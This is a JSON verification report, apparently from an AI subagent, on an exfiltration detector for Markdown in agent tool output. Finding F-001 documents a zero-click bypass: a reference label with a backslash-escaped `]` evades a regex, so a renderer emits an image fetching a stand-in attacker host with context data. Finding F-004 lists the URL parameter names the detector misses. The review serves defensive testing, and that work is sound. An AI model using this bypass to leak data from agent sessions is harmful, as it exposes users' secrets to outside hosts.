@@ -1,0 +1,317 @@
+{
+  "contract_version": "1.0.0",
+  "run_id": "T82-2026-09-07-independent-verification",
+  "dispatch_id": "T82",
+  "status": "DONE_WITH_CONCERNS",
+  "summary": "Both T81 repairs are confirmed. The cost property holds: the `!` gate move is behaviour-preserving (17 of 19 prior matrices byte-identical to five prior rounds), the load-bearing `]` fact was verified from the pattern rather than the prose (fuzz over 237186 generated keys, zero containing `]`), the disjointness consequence was independently re-derived and found correct with a tighter bound than the file states, and no shape I could construct grows faster than its size: 22 shapes x 4 sizes gave exponents 0.73-1.44 with `overOneSecond: []`, and six attacker-controlled dials swept at a constant 262144 bytes moved cost by a total spread of at most 36.1 ms. Duplicate handling is closed for all six T78 spellings plus eleven more, in both orders, at all four public boundaries, and the stronger form is the right call: the benign corpus is byte-identical. All three reviewer probes were re-run and agree. RED evidence was reproduced independently by reverting three hunks in an isolated copy: all three T81 tests fail there, worst shape 52004.5 ms. HOWEVER, verifying the structural fact from the pattern surfaced a third, pre-existing zero-click bypass: REFERENCE_DEF's `[^\\]]+` capture cannot see a definition whose label carries a backslash-escaped `]`, which CommonMark permits and `marked` resolves; five spellings reach all four public boundaries with `redaction.state: \"none\"` and zero findings. That is blocking and reproduced at a public boundary, so it fires the scope decision's single exception and may not be filed as a residual. The other four findings are documentation-grade.",
+  "summary_markdown": null,
+  "acceptance": [
+    {
+      "criterion": "AC5 (AFC-15): no field-name or spelling bypass; a URL secret is masked; a public Markdown link is not treated as a network send",
+      "status": "partial",
+      "evidence": "URL secret masked in query and path position and a public Markdown link (inline and reference form) released with 0 findings; the same secret is caught under `apiKey`, `zzz_random_field` and `\"A P I   K E Y\"`, so there is no field-name bypass (T82-ac5.log). NOT met on spelling: five reference-label spellings carrying a backslash-escaped `]` bypass the floor entirely (T82#F-001, T82-escape.log)."
+    },
+    {
+      "criterion": "Both repairs closed at the detector and at all four public boundaries, each pinned by a test that fails without the change",
+      "status": "met",
+      "evidence": "T78-dup.ts re-run: leakingCount 0, rows 2/2/2/2/2/3 findings, control unchanged at 1. T82-dup.ts (29 shapes incl. reversed order and 11 unlisted spellings): every one closed at all four boundaries. T78-perf.ts: shapesOverOneSecond [], superLinearShapes []. T78-boundary.ts: boundariesOverOneSecond [], 16.6-25.6 ms. RED reproduced in an isolated reverted copy: all three T81 tests fail (wsInflatedBangRun_withLongDef=52004.5ms, balancedNest_withLongDef=9665.7ms, budget test elapsed<500ms:false, duplicate test attacker host present). Focused suites 112 pass / 0 fail / 1168 expect(). Caveat recorded as T82#F-002: the duplicate test names two of the four boundaries; the other two are closed by probe only."
+    },
+    {
+      "criterion": "No shape costs more than a second at any boundary at any size tested up to a megabyte, and the worst found is stated",
+      "status": "met",
+      "evidence": "9 shapes x 3 sizes x 4 boundaries, one shape per process, best-of-three. Worst reading anywhere: `resolvingBangUses` at 1048618 bytes, 676.8 ms at redactToolOutput. Next worst 488.1 ms (bangBalancedNest_bracketKey, 699089 bytes) and 487.4 ms (balancedNest_withLongDef, 1048587 bytes). Detector-only worst 409 ms. Raw: T82-boundary.log."
+    },
+    {
+      "criterion": "Findings classified as blocking-and-reproduced or documentation-grade so the residual list stays trustworthy",
+      "status": "met",
+      "evidence": "T82-review.md section 'Residual classification'. One blocking-and-reproduced (T82#F-001, fires the RESIDUALS exception, needs a task or an explicit accept decision); four documentation-grade (T82#F-002..F-005) with the reason each fails the exception stated. T78#F-003/F-004/F-005 were not re-opened and nothing in T78's PASS table was re-litigated."
+    },
+    {
+      "criterion": "Ruling on the three disclosed items",
+      "status": "met",
+      "evidence": "(a) Both rejected suggestions verified by execution and both refusals stand: \"İ\".toLowerCase() is 2 code units from 1 (exhaustive BMP sweep gives delta range exactly [0,1]), so an exact-length filter is unsound in the release direction and would have released the live İ vectors s17/s18; \"ΟΣ\".toLowerCase() is \"ος\" while \"Σ\".toLowerCase() is \"σ\", and a whole-document lowercase disagrees with a per-span one at a span boundary. The simpler design was NOT available. (b) LABEL_WORK_FACTOR = 8 is acceptable and naming it plainly is right; added a tighter statement — total candidate span length is bounded by (maxOpenBrackets+1) x content.length with no budget at all, so the constant only binds when a key carries 8 or more `[`. (c) The megabyte residual belongs in RESIDUALS.md, with a measured number: worst 676.8 ms at 1 MB and one second falling at roughly 1.5 MB, not ~2 MB."
+    }
+  ],
+  "artifacts": [
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T82-review.md",
+      "kind": "review",
+      "exists": true,
+      "summary": "The review: scope, summary by severity, one row per dispatched item, five findings, residual classification, rulings on the three disclosed items, confirmed clean areas, evidence with raw log paths and hashes, routing audit, keryx:findings block."
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T82-result.json",
+      "kind": "final-report",
+      "exists": true,
+      "summary": "This file."
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T82-dup.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "29 duplicate-definition shapes across the four public boundaries: T78's six, the reversed order, Unicode case-mapping collisions, allowlist interactions and five controls.",
+      "hash": "d63664918a0b19b1732566701fed65b0742cfafa00074e6a0e639bb811f088b5"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T82-escape.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "18 CommonMark label spellings driven through detectExfil and marked at the four boundaries; the probe that reproduces T82#F-001.",
+      "hash": "6eb8e17deced291eba5495955e07326decba13059c24addf3e0f6dddecdd4d6a"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T82-cost.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "Attack on the cost property: 22 adversarial shapes in a growth ladder, plus six attacker-controlled dials swept at constant total size.",
+      "hash": "f06baebb47a0a995ba9d2eada495e7993e85a888c5d708f93eae14763b7d0d59"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T82-boundary.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "Megabyte-scale boundary timings one shape per process, and the work budget's exhaustion semantics.",
+      "hash": "09be51f91aa66e718e8d43e277c81edbd8aa6d3a71666cc17e6c1f303680f623"
+    },
+    {
+      "path": ".metaproject/data/gdctx/raw/T82-escape.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "bypasses: [s01EscapedClose, s02EscapedCloseShort, s03EscapedCloseFull, s04EscapedCloseCollapsed, s05TwoEscapedCloses] — the evidence for T82#F-001.",
+      "hash": "2f86456d015816ee1837b6aa736bd789e752c4c3906238d2f5144ca19fe81ae3"
+    },
+    {
+      "path": ".metaproject/data/gdctx/raw/T82-dup.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "29 duplicate shapes; zeroClickLeaks limited to the two escaped-`]` rows, every duplicate spelling closed.",
+      "hash": "a5089a62eab05134281fd6cff47452b6442afd6a78151593ec21fe154f2e160f"
+    },
+    {
+      "path": ".metaproject/data/gdctx/raw/T82-cost-ladder.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "22 shapes x 4 sizes, overOneSecond [].",
+      "hash": "54a74e4741bef6a9f895f292a6bf0a729bea47b2f6bcdb7c3721e81aa3642b76"
+    },
+    {
+      "path": ".metaproject/data/gdctx/raw/T82-cost-sweep.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "Six attacker dials at a constant 262144 bytes; total spread at most 36.1 ms.",
+      "hash": "64c2c96304c6b0bd32eb496663fbf703410b768d10c9eb925c2c0c187f2bb3c3"
+    },
+    {
+      "path": ".metaproject/data/gdctx/raw/T82-boundary.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "9 shapes x 3 sizes x 4 boundaries; worst 676.8 ms at 1048618 bytes.",
+      "hash": "41cfd736e8087927fbb186531a18d29c12c5613110f7fe56d3e6a1c5a6316770"
+    },
+    {
+      "path": ".metaproject/data/gdctx/raw/T82-budget.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "Budget exhaustion flags every definition including an unused one; the allowlisted twin returns 0 findings.",
+      "hash": "62595fb89f4c0e09df41085b649f843ea71e52be77b3ae1be77e2d2c236fcdde"
+    },
+    {
+      "path": ".metaproject/data/gdctx/raw/T82-ac5.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "AC5 spot check: URL secret masked, public link released, no field-name bypass.",
+      "hash": "90c6aba82e26ade235d63c3c5c1d4ae398d749f56bdfcef9d2eb0aa7a6c630ca"
+    },
+    {
+      "path": ".metaproject/data/gdctx/raw/T82-matrices.txt",
+      "kind": "context",
+      "exists": true,
+      "summary": "My own 19-probe hash table: 17 identical to T81's, T78-md at 4a9034bc… byte-identical to T81's after-log, T53-corpus differing only in the whole-repository header.",
+      "hash": "261b77255d2c2b38d282e6249b3c77463be002a95df37b3bf6df5fe39f8e82b8"
+    },
+    {
+      "path": ".metaproject/data/gdctx/raw/T82-T78-dup.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "Reviewer probe T78-dup.ts re-run unmodified: leakingCount 0.",
+      "hash": "46c556d7bce3711e4653a1b749c880f44f05e945864760bdda02095cb95989ff"
+    },
+    {
+      "path": ".metaproject/data/gdctx/raw/T82-T78-perf.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "Reviewer probe T78-perf.ts re-run unmodified: shapesOverOneSecond [], superLinearShapes [].",
+      "hash": "24db519b45d1c981d84fb668ebc80c8be2ed12f70cad89949783703b7fdec3e7"
+    },
+    {
+      "path": ".metaproject/data/gdctx/raw/T82-T78-boundary.log",
+      "kind": "context",
+      "exists": true,
+      "summary": "Reviewer probe T78-boundary.ts re-run unmodified: boundariesOverOneSecond [], 16.6-25.6 ms.",
+      "hash": "ec0a929624b6c5baee0866eead0e7a5dcad36c7f0f05026fb6092c215ac46c1c"
+    }
+  ],
+  "changed_files": [
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T82-review.md",
+      "change": "added (review report)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T82-result.json",
+      "change": "added (subagent result)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T82-dup.ts",
+      "change": "added (probe)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T82-escape.ts",
+      "change": "added (probe)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T82-cost.ts",
+      "change": "added (probe)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T82-boundary.ts",
+      "change": "added (probe)"
+    },
+    {
+      "path": ".metaproject/data/gdctx/raw/T82-*.log, T82-matrices.txt",
+      "change": "added (raw evidence logs, 30 files, same directory prior rounds use)"
+    }
+  ],
+  "findings": [
+    {
+      "id": "F-001",
+      "global_id": "T82#F-001",
+      "reviewer": "T82-independent-verifier",
+      "severity": "blocker",
+      "file": "src/security/detect/exfil.ts",
+      "line": 647,
+      "symbol": "REFERENCE_DEF",
+      "problem": "REFERENCE_DEF captures the reference label as `[^\\]]+`, so a definition whose label contains a backslash-escaped `]` — which CommonMark permits and `marked` resolves — is never captured. `refs` stays empty, the reference pass at :1439 does not run, and the document yields zero findings.",
+      "impact": "Zero-click exfiltration bypass in the mandatory floor. Five spellings (shortcut, short, full, collapsed, two-escape) each have `marked` emit <img src=\"https://attacker.invalid/p?ctx=CTX\"> while dispatchCallTool, prepareOutputForPersistence, validateOutputForTransport and redactToolOutput all carry the attacker host and report redaction.state \"none\". A non-empty allowlist does not help; the secrets floor masks only a secret-shaped parameter and leaves the attacker host and the fetch intact. Pre-existing (the same capture is at HEAD 0bc6418) but live on this tree, and it falsifies the completeness claim at policies.md:28 for the reference forms.",
+      "suggested_fix": "Widen the definition capture to admit escaped closers, e.g. `\\[((?:[^\\]\\\\]|\\\\.)+)\\]:`, and in the same change convert readLabel's `]` rejection at :769 from a necessary condition into a derived threshold (max `]` any key carries, normally 0), exactly as the `[` condition already works, so the disjointness argument survives in the ordinary case and the pathological case falls to the existing work budget. Rewrite the header comment at :707-717, which asserts the now-weakened fact. If out of budget for phase 1, flag every reference definition in a document containing `\\]` inside a bracket run.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T82-escape.ts -> bypasses: [s01EscapedClose, s02EscapedCloseShort, s03EscapedCloseFull, s04EscapedCloseCollapsed, s05TwoEscapedCloses], each detectorFindings 0, mcpState \"none\", all four boundary flags true; control s00Baseline closed at 1 finding. Raw: .metaproject/data/gdctx/raw/T82-escape.log (sha256 2f86456d015816ee1837b6aa736bd789e752c4c3906238d2f5144ca19fe81ae3). Reached independently as e1EscapedCloseInLabel / e2EscapedCloseDup in T82-dup.log.",
+      "confidence": "high",
+      "blocking_merge": true,
+      "class_scope": {
+        "sites": [
+          "src/security/detect/exfil.ts:647 (REFERENCE_DEF, the only definition-site pattern)",
+          "src/security/detect/exfil.ts:769 (the `]` rejection that becomes unsound if the capture widens)",
+          "src/security/detect/exfil.ts:707-717 (header comment asserting the structural fact)",
+          "src/security/detect/exfil.ts:529-531 (the use-side decision not to honour backslash escapes)",
+          "docs/requirements/keryx-agent-first-core/policies.md:28 (the completeness claim over the reference spellings)"
+        ],
+        "enumeration_method": "Every CommonMark link-label syntax feature that can change the bytes between `[` and `:` was enumerated from the spec's link-label rules and driven through both detectExfil and marked: escaped `]`, escaped `[`, escaped backslash, numeric character reference, named entity, multi-line label, next-line destination, indentation, title, and the two Unicode case-mapping edges (U+0130, Final_Sigma) — 18 cases in T82-escape.ts. Exactly one feature diverges, in all five of its reachable use spellings; the other nine are closed at 1 finding each."
+      },
+      "verification": {
+        "verdict": "confirmed",
+        "method": "execution",
+        "evidence": "T82-escape.ts and T82-dup.ts each reach the class independently at all four public boundaries; git show HEAD:src/security/detect/exfil.ts confirms the identical `[^\\]]+` capture at HEAD, so it is pre-existing rather than a T81 regression.",
+        "verifier": "T82-independent-verifier"
+      }
+    },
+    {
+      "id": "F-002",
+      "global_id": "T82#F-002",
+      "reviewer": "T82-independent-verifier",
+      "severity": "minor",
+      "file": "src/security/detect/exfil.test.ts",
+      "line": 1535,
+      "symbol": "T81#F-002 regression test",
+      "problem": "The duplicate-definition regression test asserts at the detector, applyRedaction, prepareOutputForPersistence and validateOutputForTransport. Two of the four public boundaries named in the dispatch — dispatchCallTool and redactToolOutput — are not read by it.",
+      "impact": "Durability gap, not an open hole: both are closed today across all 29 shapes in T82-dup.log, and both funnel through the same redaction the test exercises. It matters only because F-002's distinguishing feature was a boundary reporting state \"redacted\" while carrying the host, and the two boundaries whose state field carried that report are the two the test does not read.",
+      "suggested_fix": "Add dispatchCallTool and redactToolOutput rows to the existing loop, or state in the test header which existing suite covers them and name the case.",
+      "evidence": "src/security/detect/exfil.test.ts:1549-1572 read against the four boundary names in T81-implementation.md Part 2; all four verified closed by bun .../T82-dup.ts (raw: .metaproject/data/gdctx/raw/T82-dup.log).",
+      "confidence": "high",
+      "blocking_merge": false
+    },
+    {
+      "id": "F-003",
+      "global_id": "T82#F-003",
+      "reviewer": "T82-independent-verifier",
+      "severity": "minor",
+      "file": "src/security/detect/exfil.ts",
+      "line": 656,
+      "symbol": "normaliseLabel",
+      "problem": "CommonMark matches link labels after context-insensitive Unicode case folding; normaliseLabel uses String.prototype.toLowerCase, which is context-sensitive. \"ΟΣ\".toLowerCase() is \"ος\" (U+03C2) where case folding gives \"οσ\", so `![οσ]` resolves against `[ΟΣ]: URL` under a folding renderer and not here.",
+      "impact": "Not reproduced with a fetching renderer. marked uses toLowerCase too and agrees with the detector on every sigma spelling driven (s13-s16, u3, u4); the only residue is textual — in u4FinalSigmaRev the attacker URL survives all four boundaries as plain text with no renderer fetching it. Reachable only against a strictly conformant folding renderer, which is outside the measured threat model.",
+      "suggested_fix": "None under this dispatch. If a later round widens the renderer set beyond marked, switch to case folding and apply it on both the definition and use sides in the same change, per the rule already recorded at exfil.ts:654.",
+      "evidence": "T82-escape.log rows s13SigmaUseMedial (0 findings, no <img>) and s14SigmaUseFinal (1 finding); T82-dup.log row u4FinalSigmaRev in textResidue. Code points: \"ΟΣ\".toLowerCase() -> U+03BF U+03C2, \"Σ\".toLowerCase() -> U+03C3; \"xΟΣy\".toLowerCase().slice(1,3) != \"xΟΣy\".slice(1,3).toLowerCase().",
+      "confidence": "high",
+      "blocking_merge": false
+    },
+    {
+      "id": "F-004",
+      "global_id": "T82#F-004",
+      "reviewer": "T82-independent-verifier",
+      "severity": "minor",
+      "file": "src/security/detect/exfil.ts",
+      "symbol": "isSensitiveDestination",
+      "problem": "The inline-link sensitivity keyword list flags token, api_key, apikey, secret, password and access_token but releases session, sessionid, pwd, auth, key and sig.",
+      "impact": "Bounded and not zero-click: a link requires a click, and the image path is deny-by-default for any external host regardless of parameter name (verified: ![a](...?session=X) -> 1 finding). This widens a click-gated surface only.",
+      "suggested_fix": "None under this dispatch; it is a keyword-list completeness question on a click-gated surface, which is the shape the recorded scope decision closes.",
+      "evidence": "16-key sweep through detectExfil: [[\"token\",1],[\"api_key\",1],[\"apikey\",1],[\"session\",0],[\"sessionid\",0],[\"secret\",1],[\"password\",1],[\"pwd\",0],[\"auth\",0],[\"access_token\",1],[\"key\",0],[\"sig\",0],[\"code\",0],[\"ctx\",0],[\"data\",0],[\"q\",0]]; urlSecretLink row in .metaproject/data/gdctx/raw/T82-ac5.log.",
+      "confidence": "high",
+      "blocking_merge": false
+    },
+    {
+      "id": "F-005",
+      "global_id": "T82#F-005",
+      "reviewer": "T82-independent-verifier",
+      "severity": "info",
+      "file": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T82-cost.ts",
+      "symbol": "manyDefsThenBangRun",
+      "problem": "My own ladder reports growth exponent 5.73 for this shape. It is an artifact: the builder caps the definition block at 4000 entries, so bytes move only 588893 -> 700893 (x1.19) across the four points while the `![` run moves x8, and the exponent is computed against bytes.",
+      "impact": "None on the verdict. Cost moves 7.6 -> 20.6 ms, linear in the dial that actually changed, and every point is three orders of magnitude under the budget. Recorded so a later round does not read the row as superlinearity in the detector.",
+      "suggested_fix": "None; the probe is a review artifact, not shipped code.",
+      "evidence": ".metaproject/data/gdctx/raw/T82-cost-ladder.log, superLinear: [\"manyDefsThenBangRun\"], row measured 588893:7.6ms 604893:8.6ms 636893:13ms 700893:20.6ms.",
+      "confidence": "high",
+      "blocking_merge": false
+    }
+  ],
+  "questions": [
+    {
+      "id": "Q-001",
+      "question": "T82#F-001 is a blocker reproduced at all four public boundaries, so the recorded scope decision's single exception applies and it cannot be filed in RESIDUALS.md. Should it be opened as a task now, or does the user explicitly accept a known zero-click bypass in the mandatory floor for phase 1?",
+      "why": "RESIDUALS.md states that a blocker reproduced at a public boundary «нельзя оставлять задокументированной, потому что она означает работающий обход в обязательном слое». The verifier cannot make that call: it is either a new task on a surface the user closed, or a user decision to accept the bypass. The fix is a definition-site pattern change plus a matching change to readLabel's `]` rejection, which is a T81-sized piece of work and not a one-liner.",
+      "options": [
+        {
+          "id": "task",
+          "label": "Open a task to widen REFERENCE_DEF and convert the `]` rejection to a derived threshold",
+          "recommended": true
+        },
+        {
+          "id": "over-approximate",
+          "label": "Cheaper interim: flag every reference definition in a document containing `\\]` inside a bracket run"
+        },
+        {
+          "id": "accept",
+          "label": "Explicitly accept the bypass for phase 1 and record the acceptance, not the finding, in RESIDUALS.md"
+        }
+      ],
+      "can_be_resolved_by_agent": false
+    }
+  ],
+  "errors": [],
+  "metrics": {
+    "duration_ms": null,
+    "prompt_tokens": null,
+    "output_tokens": null,
+    "retries": null,
+    "probes_written": 4,
+    "probe_shapes_measured": 78,
+    "prior_matrices_rerun": 19,
+    "prior_matrices_byte_identical": 17,
+    "reviewer_probes_rerun": 3,
+    "focused_suite_tests": 112,
+    "focused_suite_failures": 0,
+    "worst_boundary_ms_at_one_megabyte": 676.8,
+    "constant_size_dial_sweep_max_spread_ms": 36.1,
+    "structural_fact_fuzz_keys": 237186,
+    "structural_fact_violations": 0
+  },
+  "timestamp_utc": "2026-09-07T02:05:00Z"
+}
